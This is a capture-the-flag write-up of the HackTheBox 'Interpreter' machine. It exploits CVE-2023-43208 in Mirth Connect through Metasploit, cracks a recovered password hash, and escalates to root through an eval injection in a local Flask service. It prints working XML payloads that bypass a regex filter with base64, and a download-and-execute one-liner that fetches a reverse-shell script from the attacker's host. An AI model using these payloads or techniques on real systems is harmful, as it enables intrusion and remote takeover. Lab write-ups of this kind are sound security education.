---
title: "HackTheBox - Interpreter writeup (Linux/Medium)"
categories: [HackTheBox, linux-medium]
tags: [HackTheBox, linux-medium, Interpreter, nmap, http, ssh, mirth-connect, CVE-2023-43208, xxe, rce, flask, xml, ssti, eval-injection, python, mysql, hashcat, nxc, nxc-ssh]
---

`Interpreter` is a medium Linux box from season 10, running a `MirthConnect` instance vulnerable to `CVE-2023-43208` which gives unauthenticated RCE, I used that to get a shell, found credentials for `sedric` in a properties file and cracked his hash to get user, for root I found an internal `Flask` app listening on localhost that parses XML and passes user-controlled fields through a python `eval`, I bypassed the regex filter using base64-encoded commands to get a root shell

## Recon
### nmap scan

I ran `nmap` on the host and found `ssh` on 22 and a `Jetty` web server on both 80 and 443

```bash
# Nmap 7.99 scan initiated Wed Jun  3 20:05:51 2026
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp  open  http     Jetty
443/tcp open  ssl/http Jetty
```

the web server on both ports has the title `Mirth Connect Administrator`, `MirthConnect` is a healthcare integration engine used to route, transform and process HL7 and other medical messages

### MirthConnect - CVE-2023-43208

a quick version check tells me its running `4.4.0`, which is vulnerable to `CVE-2023-43208`, an unauthenticated RCE via a Java deserialization chain

I used the `msfconsole` module for this one, popped a shell as `mirthconnect`

```bash
msf6 exploit(multi/http/mirth_connect_rce) > run

[*] Started reverse TCP handler on 10.10.14.12:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Executing /usr/bin/python3 for command execution...
[+] Deleted /tmp/sSfvnSNf
[*] Sending stage (3045380 bytes) to 10.129.244.184
[*] Meterpreter session 1 opened
```

### Foothold - credentials in properties file

poking around the box I found a `something.properties` file with mysql credentials, and inside the database I found `sedric`'s password hash

the hash format was a bit odd, first 8 bytes are the salt and the rest is the actual hash, I borrowed a script to extract and format it properly then cracked it with `hashcat`

```bash
$ hashcat -m <mode> sedric.hash /usr/share/wordlists/rockyou.txt
...
<hash>:snowflake1
```

logged in over ssh

```bash
$ nxc ssh 10.129.1.231 -u sedric -p snowflake1
SSH  10.129.1.231  22  10.129.1.231  [+] sedric:snowflake1  Linux - Shell access!

$ ssh sedric@10.129.1.231
sedric@interpreter:~$ cat user.txt
b0****************************46
```

## Privilege Escalation
### Internal service enumeration

once inside I ran `ss` to check for any interesting internal ports

```bash
sedric@interpreter:/tmp$ ss -lntp
State    Recv-Q  Send-Q  Local Address:Port   Peer Address:Port
LISTEN   0       256     0.0.0.0:6661          0.0.0.0:*
LISTEN   0       80      127.0.0.1:3306        0.0.0.0:*
LISTEN   0       128     127.0.0.1:54321        0.0.0.0:*
LISTEN   0       50      0.0.0.0:80            0.0.0.0:*
LISTEN   0       128     0.0.0.0:22            0.0.0.0:*
LISTEN   0       50      0.0.0.0:443           0.0.0.0:*
```

port `54321` stood out, it's only listening locally, I poked at it with `nc` and it returned an HTTP 400 error, so it's an HTTP server

```bash
sedric@interpreter:/tmp$ nc 127.1 54321
dd
<!DOCTYPE HTML>
...
<p>Error code: 400</p>
<p>Message: Bad request syntax ('dd').</p>
```

I used `ligolo` to proxy the traffic and browse it from my machine. visiting `/` gives a 404 — the 0xdf-style 404 page immediately tells me it's a `Flask` app

`ps aux` confirms it

```bash
root  3490  /usr/bin/python3 /usr/local/bin/notif.py
```

### Source code analysis - eval injection

catting `/usr/local/bin/notif.py` reveals the full source. it's a notification server that receives XML containing patient data (originally from `MirthConnect` over HL7), parses it, and writes a formatted notification file to `/var/secure-health/patients/`

the interesting part is the `template` function

```python
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    ...
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, ..."
    try:
        return eval(f"f'''{template}'''")
```

so it enforces a regex, then passes user-controlled input directly into `eval` via an f-string. the regex is strict — no spaces, no `$`, no backticks, but it **does** allow `=` and `+`, which is enough to do base64

the classic trick here: `__import__('base64').b64decode('...')` fits the regex perfectly since base64 output only uses alphanumerics and `+/=`

to run `id`:

```xml
<?xml version="1.0"?>
<patient>
    <firstname>{__import__('os').popen(__import__('base64').b64decode('aWQ=').decode()).read()}</firstname>
    <lastname>jeff2</lastname>
    <sender_app>jeff3</sender_app>
    <timestamp>jeff4</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>appache_helicopter6</gender>
</patient>
```

```bash
$ curl -X POST -H "Content-Type: application/xml" 240.0.1:54321/addPatient -d @data.xml
Patient uid=0(root) gid=0(root) groups=0(root)
 jeff2 (appache_helicopter6), 26 years old, received from jeff3 at jeff4
```

running as `root`.

### Getting a root shell

I put a reverse shell payload in `/tmp/lab/payload.sh`, spun up a python web server on port 8000, then base64-encoded the download-and-execute one-liner to use as the command

```bash
$ echo -n 'wget http://10.10.14.12:8000/payload.sh -O -|bash' | base64
d2dldCBodHRwOi8vMTAuMTAuMTQuMTI6ODAwMC9wYXlsb2FkLnNoIC1PIC18YmFzaA==
```

updated the xml with that b64 string in the `firstname` field and sent it

```xml
$ cat data.xml
<?xml version="1.0"?>
<patient>
    <firstname>{__import__('os').popen(__import__('base64').b64decode('d2dldCBodHRwOi8vMTAuMTAuMTQuMTI6ODAwMC9wYXlsb2FkLnNoIC1PIC18YmFzaA==').decode()).read()}</firstname>
    <lastname>jeff2</lastname>
    <sender_app>jeff3</sender_app>
    <timestamp>jeff4</timestamp>
    <birth_date>01/01/2000</birth_date>
    <gender>appache_helicopter6</gender>
</patient>
```

caught the shell with `penelope`

```bash
[+] Got reverse shell from interpreter~10.129.1.231-Linux-x86_64
[+] Shell upgraded successfully using /usr/bin/python3!

root@interpreter:~# cat root.txt
c3****************************69
```
